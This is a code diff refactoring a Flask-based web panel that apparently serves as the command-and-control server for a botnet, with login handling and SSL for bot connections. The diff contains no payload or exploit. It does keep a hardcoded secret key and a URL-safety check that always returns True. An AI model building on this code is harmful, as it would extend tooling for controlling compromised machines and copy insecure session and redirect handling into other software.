@@ -13,14 +13,10 @@ import sys
 
 # Loading library depends on how we want to setup the project later,
 # for now this will do
-try:
-    from server.botnetclasses import BotNet
-    from server.botnetserver import BotServer
-    from server.serverclasses import UserManager
-except:
-    from botnetclasses import BotNet
-    from botnetserver import BotServer
-    from serverclasses import UserManager
+from server.botnetclasses import BotNet
+from server.botnetserver import BotServer
+from server.serverclasses import UserManager
+from server.flaskdb import db
 
 ''' See accompanying README for TODOs.
 
@@ -38,7 +34,9 @@ async_mode = None
 app = flask.Flask(__name__)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['SECRET_KEY'] = 'secret!'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
 socketio = SocketIO(app, async_mode=async_mode)
+db.init_app(app)
 
 thread = None
 # Login stuff
@@ -83,12 +81,18 @@ def login():
 @login_required
 def logout():
     flask_login.logout_user()
-    return flask.redirect('/login')
+    return flask.url_for('login')
 
 
 # Research more
 def is_safe_url(next):
     return True
+
+
+@app.route("/profile")
+@login_required
+def change_password():
+    pass
 
 
 # Done with login stuff
@@ -300,7 +304,9 @@ def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
         open(C_F, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
         open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
 
-if __name__ == "__main__":
+def main():
+    global botnet
+    global botserver
 
     USE_SSL_FLASK = False
     USE_SSL_BOTS = True
@@ -325,7 +331,7 @@ if __name__ == "__main__":
             print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n" +
                   "\ttry a different python version or turn off SSL")
 
-    botnet = BotNet(socketio, downloadpath=DOWNLOAD_FOLDER)
+    botnet = BotNet(socketio)
     if USE_SSL_BOTS:
         botserver = BotServer(botnet, socketio, certfile=CERT_FILE, keyfile=KEY_FILE)
     else:
